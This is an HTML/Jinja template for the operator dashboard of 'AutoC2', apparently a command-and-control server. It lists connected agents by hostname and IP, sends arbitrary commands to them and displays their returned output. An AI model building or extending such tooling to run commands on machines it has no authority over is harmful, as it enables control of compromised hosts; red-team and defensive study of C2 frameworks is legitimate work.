<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AutoC2 | Dashboard</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>

    <!-- Dashboard content -->
    <div class="container">

        <h1 class="title">AutoC2</h1>

        <!-- Navbar with links -->
        <nav class="navbar">
            <div class="nav-links">
                <a href="{{ url_for('dashboard') }}" class="button">Dashboard</a>
                <a href="{{ url_for('logs') }}" class="button">Logs</a>
            </div>
            <div class="nav-links">
                <a href="{{ url_for('logout') }}" class="button">Logout</a>
            </div>
        </nav>
        
        <div class="main">
            <div class="agents-header">
                <h2 style="color: #ffffff;">Agents</h2>
                <button onclick="location.reload();" class="refresh-btn"><i class="fas fa-sync-alt"></i></button>
            </div>            

            {% for agent in agents %}
                <div class="dropdown" id="dropdown-{{ agent.id }}" onclick="toggleDropdown({{ agent.id }})">
                    <div class="dropdown-header">
                        <h3>{{ agent.hostname }} ({{ agent.ip }}) - Agent ID: {{ agent.id }}</h3>
                        <button onclick="removeAgent({{ agent.id }});" class="close-btn"><i class="fas fa-times"></i></button>
                    </div>
                    <div class="dropdown-content" id="content-{{ agent.id }}" onclick="event.stopPropagation();">
                        <form onsubmit="event.preventDefault(); sendCommand({{ agent.id }});">
                            <label for="command-{{ agent.id }}">Command:</label>
                            <input type="text" id="command-{{ agent.id }}" style="width: 50%;" required>
                            <button type="submit" class="button">Send</button>
                        </form>
                        
                        <div id="output-{{ agent.id }}" class="output"></div>

                        <h4>Output:</h4>
                        <div>
                            <!-- Buttons for output logs 1-10 -->
                            {% for i in range(1, agent.curr_cmd_id) %}
                            <button class="button" onclick="retrieveOutput({{ agent.id }}, {{ i }})">{{ i }}</button>
                            {% endfor %}
                        </div>
                        
                        <!-- Dynamic output log display area -->
                        <div id="agent-{{ agent.id }}" class="output">
                        </div>
                    </div>
                </div>
            {% endfor %}
        </div>
        
    </div>

    <script>
        // Function to toggle dropdown visibility
        function toggleDropdown(agentId) {
            const dropdown = document.getElementById(`dropdown-${agentId}`);
            const content = document.getElementById(`content-${agentId}`);

            // Toggle dropdown open/close
            const isOpen = dropdown.classList.toggle('open');
            // Store the dropdown state in localStorage
            localStorage.setItem(`dropdown-${agentId}`, isOpen ? 'open' : 'closed');
        }

        // Function to check and restore dropdown state on page load
        function restoreDropdowns() {
            {% for agent in agents %}
                const state = localStorage.getItem(`dropdown-{{ agent.id }}`);
                const dropdown = document.getElementById(`dropdown-{{ agent.id }}`);
                const content = document.getElementById(`content-{{ agent.id }}`);
                
                // Restore the dropdown state based on localStorage
                if (state === 'open') {
                    dropdown.classList.add('open');
                } else {
                    dropdown.classList.remove('open');
                }
            {% endfor %}
        }

        // Call restoreDropdowns when the page loads
        window.onload = restoreDropdowns;

        function sendCommand(agentId) {
            const commandInput = document.getElementById(`command-${agentId}`);
            const command = commandInput.value;
            const outputDiv = document.getElementById(`output-${agentId}`);

            if (command.trim() === "") {
                alert("Please enter a command.");
                return;
            }

            // Send command to the server using AJAX
            fetch(`/send_command`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ agent_id: agentId, command: command })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    outputDiv.innerHTML = `<strong>[INFO] Command sent:</strong> ${command}<br>`;
                } else {
                    outputDiv.innerHTML = `<strong>[ERROR]</strong> ${data.error}`;
                }
                commandInput.value = "";  // Clear the command input field
            })
            .catch(error => {
                outputDiv.innerHTML = `<strong>[ERROR]</strong> Could not send command.`;
            });
        }

        function retrieveOutput(agentId, cmdId) {
            const outputDiv = document.getElementById(`agent-${agentId}`);

            // Send command to the server using AJAX
            fetch(`/retrieve_output`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ agent_id: agentId, cmd_id: cmdId })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    outputDiv.innerHTML = `<strong>Command ${cmdId}:</strong><pre>${data.output}</pre>`;
                } else {
                    outputDiv.innerHTML = `<strong>[ERROR]</strong> ${data.error}`;
                }
            })
            .catch(error => {
                outputDiv.innerHTML = `<strong>[ERROR]:</strong> Could not retrieve command.`;
            });
        }

        function removeAgent(agentId) {
            // Confirmation prompt before removing the agent
            if (confirm("Remove agent?")) {
                // Send the request to remove the agent from the server
                fetch(`/remove_agent`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ agent_id: agentId })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        location.reload();  // Reload to update the agent list
                    } else {
                        alert(`Error: ${data.error}`);
                    }
                })
                .catch(error => {
                    alert("Error: Could not remove agent.");
                });
            }
        }
    </script>

</body>
</html>
